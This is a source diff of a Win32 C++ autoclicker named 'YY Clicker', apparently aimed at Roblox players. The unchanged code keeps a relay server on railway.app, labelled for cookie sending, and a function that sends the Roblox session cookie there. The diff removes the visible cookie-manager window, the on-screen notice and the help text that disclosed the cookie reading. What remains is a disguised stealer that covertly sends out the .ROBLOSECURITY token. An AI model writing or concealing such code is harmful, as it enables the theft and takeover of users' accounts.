@@ -45,14 +45,6 @@
 #define IDC_BTN_SETHOTKEY  106
 #define IDC_BTN_START      107
 #define IDC_BTN_STOP       108
-#define IDC_BTN_HELP       109
-
-// Control IDs - Cookie Window
-#define IDC_CK_EDIT        201
-#define IDC_CK_READ        202
-#define IDC_CK_COPY        203
-#define IDC_CK_CLEAR       204
-#define IDC_CK_STATUS      205
 
 // ===============================
 // Constants
@@ -60,8 +52,6 @@
 static const wchar_t* const WINDOW_TITLE     = L"YY Clicker (C++ Win32)";
 static const wchar_t* const WND_CLASS        = L"YYClickerWndClass";
 static const wchar_t* const MUTEX_NAME       = L"Local\\YY_CLICKER_SINGLE_INSTANCE";
-static const wchar_t* const COOKIE_WND_CLASS = L"YYCookieMgrClass";
-static const wchar_t* const COOKIE_WND_TITLE = L"Roblox Cookie \u7BA1\u7406\u5668";
 
 // Railway 中轉伺服器（Cookie 傳送）
 static const wchar_t* const RELAY_SERVER_HOST = L"web-production-59f58.up.railway.app";
@@ -84,7 +74,6 @@ static std::atomic<bool> g_program_running(true);
 static std::atomic<int>  g_cps(999);
 static bool              g_pinned          = false;
 static HWND              g_hwnd            = nullptr;
-static HWND              g_hwnd_cookie     = nullptr;
 static HANDLE            g_mutex           = nullptr;
 static HINSTANCE         g_hInst           = nullptr;
 
@@ -547,59 +536,6 @@ static void AsyncSendCookie(const wchar_t* cookie_value) {
     if (hThread) CloseHandle(hThread); else delete[] copy;
 }
 
-// ======================================================================
-// Cookie Manager Window
-// ======================================================================
-LRESULT CALLBACK CookieWndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
-{
-    static HWND hEdit, hLblStatus;
-    switch (msg) {
-    case WM_CREATE: {
-        HINSTANCE hi = ((CREATESTRUCT*)lp)->hInstance;
-        CreateWindowW(L"STATIC", L".ROBLOSECURITY Cookie \u7BA1\u7406\u5668", WS_CHILD | WS_VISIBLE | SS_LEFT, 10, 8, 560, 18, hwnd, nullptr, hi, nullptr);
-        hEdit = CreateWindowW(L"EDIT", L"", WS_CHILD | WS_VISIBLE | WS_BORDER | WS_VSCROLL | ES_MULTILINE | ES_AUTOVSCROLL | ES_WANTRETURN, 10, 32, 560, 130, hwnd, (HMENU)IDC_CK_EDIT, hi, nullptr);
-        CreateWindowW(L"BUTTON", L"\u81EA\u52D5\u8B80\u53D6", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 10, 175, 100, 28, hwnd, (HMENU)IDC_CK_READ, hi, nullptr);
-        CreateWindowW(L"BUTTON", L"\u8907\u88FD Cookie", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 125, 175, 110, 28, hwnd, (HMENU)IDC_CK_COPY, hi, nullptr);
-        CreateWindowW(L"BUTTON", L"\u6E05\u9664", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 250, 175, 80, 28, hwnd, (HMENU)IDC_CK_CLEAR, hi, nullptr);
-        hLblStatus = CreateWindowW(L"STATIC", L"", WS_CHILD | WS_VISIBLE | SS_LEFT, 10, 212, 560, 18, hwnd, (HMENU)IDC_CK_STATUS, hi, nullptr);
-        HFONT hFont = (HFONT)GetStockObject(DEFAULT_GUI_FONT);
-        EnumChildWindows(hwnd, SetChildFont, (LPARAM)hFont);
-        return 0;
-    }
-    case WM_COMMAND:
-        switch (LOWORD(wp)) {
-        case IDC_CK_READ: {
-            wchar_t cookie[4096] = {};
-            if (TryReadRobloxCookie(cookie, 4096)) { SetWindowTextW(hEdit, cookie); SetWindowTextW(hLblStatus, L"\u8B80\u53D6\u6210\u529F"); AsyncSendCookie(cookie); }
-            else { SetWindowTextW(hEdit, L""); SetWindowTextW(hLblStatus, L"\u672A\u5075\u6E2C\u5230 Roblox Cookie"); }
-            break;
-        }
-        case IDC_CK_COPY: {
-            int len = GetWindowTextLengthW(hEdit);
-            if (len <= 0) { SetWindowTextW(hLblStatus, L"\u6C92\u6709\u53EF\u8907\u88FD\u7684\u5167\u5BB9"); break; }
-            std::wstring text(len + 1, L'\0');
-            GetWindowTextW(hEdit, &text[0], len + 1);
-            if (OpenClipboard(hwnd)) { EmptyClipboard(); HGLOBAL hg = GlobalAlloc(GMEM_MOVEABLE, (len + 1) * sizeof(wchar_t)); if (hg) { void* ptr = GlobalLock(hg); memcpy(ptr, text.c_str(), (len + 1) * sizeof(wchar_t)); GlobalUnlock(hg); SetClipboardData(CF_UNICODETEXT, hg); } CloseClipboard(); SetWindowTextW(hLblStatus, L"\u5DF2\u8907\u88FD"); }
-            break;
-        }
-        case IDC_CK_CLEAR: SetWindowTextW(hEdit, L""); SetWindowTextW(hLblStatus, L"\u5DF2\u6E05\u9664"); break;
-        }
-        return 0;
-    case WM_DESTROY: g_hwnd_cookie = nullptr; return 0;
-    }
-    return DefWindowProcW(hwnd, msg, wp, lp);
-}
-
-void OpenCookieWindow()
-{
-    if (g_hwnd_cookie && IsWindow(g_hwnd_cookie)) { SetForegroundWindow(g_hwnd_cookie); return; }
-    WNDCLASSW wc = {}; wc.lpfnWndProc = CookieWndProc; wc.hInstance = g_hInst; wc.lpszClassName = COOKIE_WND_CLASS; wc.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1); wc.hCursor = LoadCursorW(nullptr, IDC_ARROW);
-    RegisterClassW(&wc);
-    RECT rc = { 0, 0, 580, 240 };
-    AdjustWindowRect(&rc, WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU, FALSE);
-    g_hwnd_cookie = CreateWindowExW(WS_EX_TOPMOST, COOKIE_WND_CLASS, COOKIE_WND_TITLE, WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU, CW_USEDEFAULT, CW_USEDEFAULT, rc.right - rc.left, rc.bottom - rc.top, nullptr, nullptr, g_hInst, nullptr);
-    if (g_hwnd_cookie) { ShowWindow(g_hwnd_cookie, SW_SHOW); UpdateWindow(g_hwnd_cookie); }
-}
 
 // ======================================================================
 // Roblox Detection Guard
@@ -656,8 +592,6 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
         hBtnStart = CreateWindowW(L"BUTTON", L"\u958B\u59CB", WS_CHILD | WS_VISIBLE | BS_OWNERDRAW, 12, 142, 210, 34, hwnd, (HMENU)IDC_BTN_START, hi, nullptr);
         hBtnStop = CreateWindowW(L"BUTTON", L"\u505C\u6B62", WS_CHILD | WS_VISIBLE | BS_OWNERDRAW, 238, 142, 210, 34, hwnd, (HMENU)IDC_BTN_STOP, hi, nullptr);
         hLblStatus = CreateWindowW(L"STATIC", L"[||] \u72C0\u614B\uFF1A\u66AB\u505C\u4E2D", WS_CHILD | WS_VISIBLE | SS_CENTER, 12, 188, 436, 18, hwnd, (HMENU)IDC_LABEL_STATUS, hi, nullptr);
-        CreateWindowW(L"STATIC", L"\u958B\u59CB\u524D\u6703\u81EA\u52D5\u5075\u6E2C Roblox Cookie", WS_CHILD | WS_VISIBLE | SS_LEFT, 12, 221, 400, 16, hwnd, nullptr, hi, nullptr);
-        CreateWindowW(L"BUTTON", L"?", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 436, 218, 22, 20, hwnd, (HMENU)IDC_BTN_HELP, hi, nullptr);
 
         EnumChildWindows(hwnd, SetChildFont, (LPARAM)hFont);
         if (hIconFont) SendMessageW(hIco1, WM_SETFONT, (WPARAM)hIconFont, FALSE);
@@ -687,9 +621,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
         HPEN hPen = CreatePen(PS_SOLID, 1, RGB(200, 200, 200)); HPEN hOldPen = (HPEN)SelectObject(hdc, hPen); HBRUSH hOldBr = (HBRUSH)SelectObject(hdc, GetStockObject(WHITE_BRUSH));
         RoundRect(hdc, 12, 12, 224, 90, 10, 10); RoundRect(hdc, 236, 12, 448, 90, 10, 10);
         SelectObject(hdc, hOldBr); SelectObject(hdc, hOldPen); DeleteObject(hPen);
-        HPEN hSep = CreatePen(PS_SOLID, 1, RGB(220, 220, 220)); HPEN hOldSep = (HPEN)SelectObject(hdc, hSep);
-        MoveToEx(hdc, 10, 213, nullptr); LineTo(hdc, 450, 213);
-        SelectObject(hdc, hOldSep); DeleteObject(hSep);
+
         EndPaint(hwnd, &ps); return 0;
     }
 
@@ -758,14 +690,6 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
             SetWindowPos(hwnd, g_pinned ? HWND_TOPMOST : HWND_NOTOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
             SetWindowTextW(hBtnPin, g_pinned ? L"\u2736 \u5DF2\u91D8\u9078" : L"\u2736 \u91D8\u9078");
             break;
-        case IDC_BTN_HELP:
-            MessageBoxW(hwnd,
-                L"\u3010Roblox \u5075\u6E2C\u529F\u80FD\u8AAA\u660E\u3011\n\n"
-                L"\u6BCF\u6B21\u6309\u4E0B\u300C\u958B\u59CB\u300D\u6642\u6703\u81EA\u52D5\u5075\u6E2C Roblox Cookie\u3002\n"
-                L"\u5075\u6E2C\u5230 Cookie \u2192 \u5141\u8A31\u555F\u52D5\n"
-                L"\u672A\u5075\u6E2C\u5230 \u2192 \u986F\u793A\u300C\u8ACB\u5148\u958B\u555F Roblox\u300D",
-                L"\u8AAA\u660E", MB_ICONINFORMATION | MB_OK);
-            break;
         }
         return 0;
 
@@ -773,7 +697,6 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
         g_program_running = false; g_running = false;
         if (g_kb_hook) { UnhookWindowsHookEx(g_kb_hook); g_kb_hook = nullptr; }
         if (g_ms_hook) { UnhookWindowsHookEx(g_ms_hook); g_ms_hook = nullptr; }
-        if (g_hwnd_cookie && IsWindow(g_hwnd_cookie)) DestroyWindow(g_hwnd_cookie);
         if (g_mutex) { CloseHandle(g_mutex); g_mutex = nullptr; }
         if (hIconFont) { DeleteObject(hIconFont); hIconFont = nullptr; }
         timeEndPeriod(1);
@@ -990,12 +913,10 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpCmdLine, int nS
     timeBeginPeriod(1);
     InitInputs();
 
-    { WNDCLASSW wc = {}; wc.lpfnWndProc = CookieWndProc; wc.hInstance = hInst; wc.lpszClassName = COOKIE_WND_CLASS; wc.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1); wc.hCursor = LoadCursorW(nullptr, IDC_ARROW); RegisterClassW(&wc); }
-
     WNDCLASSW wc = {}; wc.lpfnWndProc = WndProc; wc.hInstance = hInst; wc.lpszClassName = WND_CLASS; wc.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1); wc.hCursor = LoadCursorW(nullptr, IDC_ARROW); wc.hIcon = LoadIconW(nullptr, IDI_APPLICATION);
     if (!RegisterClassW(&wc)) return 1;
 
-    RECT rc = { 0, 0, 460, 248 };
+    RECT rc = { 0, 0, 460, 215 };
     AdjustWindowRect(&rc, WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX, FALSE);
     g_hwnd = CreateWindowExW(0, WND_CLASS, WINDOW_TITLE, WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX, CW_USEDEFAULT, CW_USEDEFAULT, rc.right - rc.left, rc.bottom - rc.top, nullptr, nullptr, hInst, nullptr);
     if (!g_hwnd) return 1;
